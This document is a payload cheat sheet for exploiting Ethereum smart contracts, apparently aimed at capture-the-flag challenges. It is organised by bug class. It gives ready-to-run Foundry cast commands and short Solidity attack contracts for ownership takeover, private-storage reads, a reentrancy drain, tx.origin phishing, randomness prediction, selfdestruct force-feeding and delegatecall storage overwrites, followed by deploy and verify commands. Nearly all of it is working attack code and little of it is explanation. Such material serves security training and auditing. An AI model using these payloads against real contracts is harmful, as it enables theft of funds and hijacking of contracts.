# Payload dictionary — the call shapes by bug class

## The raw-cast payloads

```bash
# access-control
cast send $CH "setOwner(address)" $ME --private-key $KEY --rpc-url $RPC
cast send $CH "unlock()" --private-key $KEY --rpc-url $RPC
cast send $CH "setFlag(bool)" true --private-key $KEY --rpc-url $RPC
cast send $CH "initialize(address)" $ME --private-key $KEY --rpc-url $RPC
cast send $CH "register()" --private-key $KEY --rpc-url $RPC

# visibility
cast storage $CH 0; cast storage $CH 1; cast storage $CH 2
cast send $CH "unlock(bytes32)" 0x<pw> --private-key $KEY --rpc-url $RPC

# integer-overflow (pre-0.8)
cast send $CH "transfer(address,uint256)" $X 1 --private-key $KEY --rpc-url $RPC

# weak-randomness
cast send $CH "guess(uint256)" <answer> --private-key $KEY --rpc-url $RPC

# signature
cast send $CH "claim(bytes,uint256)" 0x<sig> <amt> --private-key $KEY --rpc-url $RPC

# storage-collision
cast send $PROXY "setA(address)" $EVIL --private-key $KEY --rpc-url $RPC
```

## The attack-contract payloads

```solidity
// reentrancy — deposit + the receive-hook drain
contract R { Vulnerable v; constructor(address _v){v=Vulnerable(_v);}
    function attack() payable { v.deposit{value:msg.value}(); v.withdraw(msg.value); }
    receive() payable { if(address(v).balance>=msg.value) v.withdraw(1 ether); } }

// tx.origin — the phish intermediary
contract P { function attack(address t){ Target(t).go(); } }

// weak-randomness — the same-block predict
contract Pr { function attack(address t){
    uint a = uint(keccak256(abi.encode(blockhash(block.number-1), block.timestamp)));
    Target(t).guess(a); } }

// selfdestruct — the force-feed
contract F { constructor() payable {} function boom(address t){ selfdestruct(payable(t)); } }

// delegatecall — a storage-collision writer
contract D { address public a; function pwn(){ assembly { sstore(0, caller()) } } }
```

## The deploy shapes

```bash
forge create Solver --constructor-args $CH --private-key $KEY --rpc-url $RPC
cast send --create "$(solc --bin Solver.sol | tail -1)" --value 1ether --private-key $KEY --rpc-url $RPC
```

## The verify shapes

```bash
cast call $SETUP "isSolved()(bool)"          # the predicate
cast receipt <txhash> --rpc-url $RPC          # the mined-tx proof
cast tx <txhash> --rpc-url $RPC              # the from/calldata
```

## The "what to feed" map

| Class | The feed |
|---|---|
| access-control | a `cast send` — the unguarded setter |
| reentrancy | a `receive`-reentering contract |
| delegatecall | a `delegatecall`-able function + a collision/caller-controlled target |
| tx.origin | a Phish contract between the caller and the target |
| integer-overflow | a `cast send` — the wrapping arithmetic |
| weak-randomness | a Predict contract — same-block compute |
| selfdestruct | a funded Force contract + `boom` |
| signature | the forged/replayed sig bytes |
| accounting | the deposit/donate/withdraw sequence |
| visibility | a `cast storage` read + the gate call |
